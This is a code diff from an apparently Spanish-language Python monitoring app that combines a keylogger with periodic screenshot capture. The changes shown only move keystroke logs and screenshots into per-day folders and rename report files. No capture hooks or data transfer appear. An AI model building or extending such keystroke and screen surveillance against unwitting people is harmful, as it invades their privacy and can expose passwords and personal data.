@@ -289,10 +289,20 @@ class MonitorApp:
 
     # ==================== MÉTODOS DEL KEYLOGGER ====================
 
+    def _obtener_carpeta_dia(self):
+        fecha=datetime.now().strftime("%d-%m-%Y")
+        carpeta_base=self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
+        ruta=os.path.join(carpeta_base,fecha)
+        os.makedirs(ruta, exist_ok=True)
+        return ruta
+
     def _obtener_ruta_logs(self):
         """Devuelve la ruta de la subcarpeta Logs_Teclado dentro de la carpeta de capturas actual"""
         carpeta_base = self.entry_carpeta.get().strip() if hasattr(self, 'entry_carpeta') else self.carpeta_destino
-        return os.path.join(carpeta_base, "Logs_Teclado")
+        fecha = datetime.now().strftime("%d-%m-%Y")
+        ruta=os.path.join(carpeta_base,"Logs_Teclado",fecha)
+        os.makedirs(ruta, exist_ok=True)
+        return ruta
 
     def alternar_keylogger(self):
         if not self.keylogger_activo:
@@ -329,9 +339,8 @@ class MonitorApp:
             self._guardar_buffer()
 
     def _obtener_ruta_reporte(self):
-        fecha = date.today().strftime("%Y-%m-%d")
-        ruta_logs = self._obtener_ruta_logs()
-        return os.path.join(ruta_logs, f"Reporte_Teclado_{fecha}.txt")
+        ruta_logs=self._obtener_ruta_logs()
+        return os.path.join(ruta_logs,"Reporte_Teclado.txt")
 
     def _escribir_encabezado_reporte(self):
         encabezado = (
@@ -532,8 +541,9 @@ class MonitorApp:
     def bucle_capturas(self):
         while self.monitoreando:
             try:
-                ahora = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-                ruta_completa = os.path.join(self.carpeta_destino, f"captura_{ahora}.png")
+                carpeta_dia=self._obtener_carpeta_dia()
+                hora=datetime.now().strftime("%H-%M-%S")
+                ruta_completa=os.path.join(carpeta_dia,f"captura_{hora}.png")
                 pyautogui.screenshot().save(ruta_completa)
             except:
                 pass
